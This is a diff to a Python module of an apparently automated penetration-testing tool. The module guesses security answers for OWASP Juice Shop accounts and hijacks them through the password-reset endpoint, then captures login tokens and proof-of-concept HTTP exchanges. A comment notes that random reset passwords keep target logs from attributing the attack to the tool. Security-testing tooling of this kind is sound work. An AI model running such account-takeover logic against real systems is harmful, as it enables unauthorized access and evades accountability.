@@ -242,6 +242,56 @@ def _credential_specs(raw: Any) -> list[dict[str, str]]:
     return specs
 
 
+def _path_specs(raw: Any) -> list[str]:
+    if isinstance(raw, str):
+        iterable = [raw]
+    elif isinstance(raw, (list, tuple, set)):
+        iterable = list(raw)
+    else:
+        iterable = []
+    paths: list[str] = []
+    for item in iterable:
+        path = _normalize_path_candidate(str(item or ""))
+        if path and path not in paths:
+            paths.append(path)
+    return paths
+
+
+def _reset_candidate_specs(raw: Any) -> list[dict[str, str]]:
+    specs: list[dict[str, str]] = []
+    if isinstance(raw, dict):
+        iterable = list(raw.values())
+    elif isinstance(raw, (list, tuple)):
+        iterable = list(raw)
+    else:
+        iterable = []
+
+    for index, item in enumerate(iterable):
+        if not isinstance(item, dict):
+            continue
+        identity = str(item.get("email") or item.get("username") or item.get("user") or "").strip()
+        answer = str(
+            item.get("answer")
+            or item.get("security_answer")
+            or item.get("securityAnswer")
+            or item.get("challenge_answer")
+            or item.get("challengeAnswer")
+            or ""
+        ).strip()
+        if not identity or not answer:
+            continue
+        payload = {
+            "answer": answer,
+            "source": str(item.get("source") or f"operator_reset_candidates[{index}]"),
+        }
+        if "@" in identity or item.get("email"):
+            payload["email"] = identity
+        else:
+            payload["username"] = identity
+        specs.append(payload)
+    return specs
+
+
 def _principal_from_success(success: dict[str, Any], index: int) -> dict[str, Any]:
     user_info = dict(success.get("user_info") or {})
     creds = dict(success.get("credentials_used") or {})
@@ -383,7 +433,8 @@ async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
             if not fallback_login and r.status in {301, 302, 303, 307, 308, 405, 415}:
                 fallback_login = path
 
-    await _probe_login_candidates([str(path) for path in LOGIN_PATHS])
+    supplied_login_paths = _path_specs(kwargs.get("login_paths") or kwargs.get("auth_paths"))
+    await _probe_login_candidates([*supplied_login_paths, *[str(path) for path in LOGIN_PATHS]])
 
     if not active_login:
         # Try GET-based login forms
@@ -662,7 +713,23 @@ async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
         return _finalize_successes()
 
     # Phase 5: Try password reset with common security answers
-    for reset_path in RESET_PATHS:
+    operator_reset_candidates = _reset_candidate_specs(
+        kwargs.get("reset_candidates") or kwargs.get("password_reset_candidates")
+    )
+    reset_paths = [*_path_specs(kwargs.get("reset_paths")), *[str(path) for path in RESET_PATHS]]
+    common_resets = [
+        *operator_reset_candidates,
+        {"email": "admin@juice-sh.op", "answer": "Samuel"},
+        {"email": "admin@juice-sh.op", "answer": "admin"},
+        {"email": "admin@juice-sh.op", "answer": "Admin"},
+        {"email": "jim@juice-sh.op", "answer": "Samuel"},
+        {"email": "jim@juice-sh.op", "answer": "Kirk"},
+        {"email": "jim@juice-sh.op", "answer": "Enterprise"},
+        {"username": "admin", "answer": "admin"},
+        {"username": "admin", "answer": "password"},
+        {"username": "admin", "answer": "root"},
+    ]
+    for reset_path in reset_paths:
         try:
             # First check if endpoint exists
             r = await _session.request(
@@ -673,134 +740,133 @@ async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
             if r.status == 404:
                 continue
 
-            # Try common email+answer combos
-            common_resets = [
-                ("admin@juice-sh.op", ["Samuel", "admin", "Admin"]),
-                ("jim@juice-sh.op", ["Samuel", "Kirk", "Enterprise"]),
-                ("admin", ["admin", "password", "root"]),
-            ]
-            for email, answers in common_resets:
-                for ans in answers:
-                    # Generate a unique non-identifying password per attempt so
-                    # the reset value stored/logged on the target does NOT
-                    # attribute the attack to VXIS.
-                    reset_password = f"Reset-{secrets.token_hex(6)}"
-                    r = await _session.request(
-                        "POST",
-                        reset_path,
-                        json_data={
-                            "email": email,
-                            "answer": ans,
-                            "new": reset_password,
-                            "repeat": reset_password,
+            for candidate in common_resets:
+                email = str(candidate.get("email") or candidate.get("username") or "").strip()
+                ans = str(candidate.get("answer") or "").strip()
+                if not email or not ans:
+                    continue
+                # Generate a unique non-identifying password per attempt so
+                # the reset value stored/logged on the target does NOT
+                # attribute the attack to VXIS.
+                reset_password = f"Reset-{secrets.token_hex(6)}"
+                r = await _session.request(
+                    "POST",
+                    reset_path,
+                    json_data={
+                        "email": email,
+                        "answer": ans,
+                        "new": reset_password,
+                        "repeat": reset_password,
+                    },
+                )
+                if r.status != 200:
+                    continue
+                # Try logging in with new password
+                r2 = await _session.request(
+                    "POST",
+                    active_login,
+                    json_data={"email": email, "password": reset_password},
+                )
+                if r2.status != 200:
+                    continue
+                data = r2.response.json()
+                token = ""
+                for key_path in [("authentication", "token"), ("token",)]:
+                    d = data
+                    for k in key_path:
+                        d = d.get(k, {}) if isinstance(d, dict) else {}
+                    if isinstance(d, str) and len(d) > 20:
+                        token = d
+                        break
+                if token:
+                    logger.info("Password reset authentication succeeded")
+                    reset_preview = _preview_text(r.text)
+                    login_preview = _preview_text(r2.text)
+                    control_checks = {
+                        "negative_control": baseline_control["attempt"]
+                        if baseline_control
+                        else {},
+                        "positive_control": {
+                            "phase": "password_reset",
+                            "endpoint": active_login,
+                            "creds": "[redacted]",
+                            "status": r2.status,
+                            "body_length": r2.body_length,
+                            "response_preview": login_preview,
+                            "token_observed": True,
                         },
-                    )
-                    if r.status == 200:
-                        # Try logging in with new password
-                        r2 = await _session.request(
-                            "POST",
-                            active_login,
-                            json_data={"email": email, "password": reset_password},
-                        )
-                        if r2.status == 200:
-                            data = r2.response.json()
-                            token = ""
-                            for key_path in [("authentication", "token"), ("token",)]:
-                                d = data
-                                for k in key_path:
-                                    d = d.get(k, {}) if isinstance(d, dict) else {}
-                                if isinstance(d, str) and len(d) > 20:
-                                    token = d
-                                    break
-                            if token:
-                                logger.info("Password reset authentication succeeded")
-                                reset_preview = _preview_text(r.text)
-                                login_preview = _preview_text(r2.text)
-                                control_checks = {
-                                    "negative_control": baseline_control["attempt"]
-                                    if baseline_control
-                                    else {},
-                                    "positive_control": {
-                                        "phase": "password_reset",
-                                        "endpoint": active_login,
-                                        "creds": "[redacted]",
-                                        "status": r2.status,
-                                        "body_length": r2.body_length,
-                                        "response_preview": login_preview,
-                                        "token_observed": True,
-                                    },
-                                    "reset_step": {
-                                        "endpoint": reset_path,
-                                        "status": r.status,
-                                        "response_preview": reset_preview,
-                                    },
-                                }
-                                return {
-                                    **result,
-                                    "authenticated": True,
+                        "reset_step": {
+                            "endpoint": reset_path,
+                            "status": r.status,
+                            "response_preview": reset_preview,
+                        },
+                    }
+                    return {
+                        **result,
+                        "authenticated": True,
+                        "method": "password_reset",
+                        "token": token,
+                        "identities": _dedupe_identities(
+                            [
+                                {
                                     "method": "password_reset",
                                     "token": token,
-                                    "identities": _dedupe_identities(
-                                        [
-                                            {
-                                                "method": "password_reset",
-                                                "token": token,
-                                                "user_info": _extract_token_and_user_info(
-                                                    data if isinstance(data, dict) else {}
-                                                )[1],
-                                                "credentials_used": {"email": email},
-                                            }
-                                        ]
-                                    ),
-                                    "login_endpoint": active_login,
-                                    "credentials_used": {
-                                        "email": "[redacted]",
-                                        "security_answer": "[redacted]",
-                                    },
-                                    "reset_endpoint": reset_path,
-                                    "all_attempts": all_attempts,
-                                    "control_checks": control_checks,
-                                    "poc_http_exchange": "\n\n".join(
-                                        filter(
-                                            None,
-                                            [
-                                                _format_login_transcript(
-                                                    active_login,
-                                                    {
-                                                        "email": _NEGATIVE_CONTROL_EMAIL,
-                                                        "password": "definitely-wrong-password",
-                                                    },
-                                                    baseline_control["attempt"]["status"],
-                                                    baseline_control["attempt"].get(
-                                                        "response_preview", ""
-                                                    ),
-                                                    label="negative_control",
-                                                )
-                                                if baseline_control
-                                                else "",
-                                                (
-                                                    f"[password_reset]\n"
-                                                    f"POST {reset_path} HTTP/1.1\n"
-                                                    "Content-Type: application/json\n\n"
-                                                    '{"email":"[redacted]","answer":"[redacted]",'
-                                                    '"new":"[redacted]","repeat":"[redacted]"}\n\n'
-                                                    f"HTTP/1.1 {r.status}\n\n"
-                                                    f"{reset_preview}"
-                                                ),
-                                                _format_login_transcript(
-                                                    active_login,
-                                                    {
-                                                        "email": email,
-                                                        "password": "[reset_password]",
-                                                    },
-                                                    r2.status,
-                                                    login_preview,
-                                                    label="positive_login_after_reset",
-                                                ),
-                                            ],
-                                        )
-                                    ),
+                                    "user_info": _extract_token_and_user_info(
+                                        data if isinstance(data, dict) else {}
+                                    )[1],
+                                    "credentials_used": {"email": email},
                                 }
+                            ]
+                        ),
+                        "login_endpoint": active_login,
+                        "credentials_used": {
+                            "email": "[redacted]",
+                            "security_answer": "[redacted]",
+                        },
+                        "reset_endpoint": reset_path,
+                        "all_attempts": all_attempts,
+                        "control_checks": control_checks,
+                        "poc_http_exchange": "\n\n".join(
+                            filter(
+                                None,
+                                [
+                                    _format_login_transcript(
+                                        active_login,
+                                        {
+                                            "email": _NEGATIVE_CONTROL_EMAIL,
+                                            "password": "definitely-wrong-password",
+                                        },
+                                        baseline_control["attempt"]["status"],
+                                        baseline_control["attempt"].get(
+                                            "response_preview", ""
+                                        ),
+                                        label="negative_control",
+                                    )
+                                    if baseline_control
+                                    else "",
+                                    (
+                                        f"[password_reset]\n"
+                                        f"POST {reset_path} HTTP/1.1\n"
+                                        "Content-Type: application/json\n\n"
+                                        '{"email":"[redacted]","answer":"[redacted]",'
+                                        '"new":"[redacted]","repeat":"[redacted]"}\n\n'
+                                        f"HTTP/1.1 {r.status}\n\n"
+                                        f"{reset_preview}"
+                                    ),
+                                    _format_login_transcript(
+                                        active_login,
+                                        {
+                                            "email": email,
+                                            "password": "[reset_password]",
+                                        },
+                                        r2.status,
+                                        login_preview,
+                                        label="positive_login_after_reset",
+                                    ),
+                                ],
+                            )
+                        ),
+                    }
         except Exception:
             continue
 
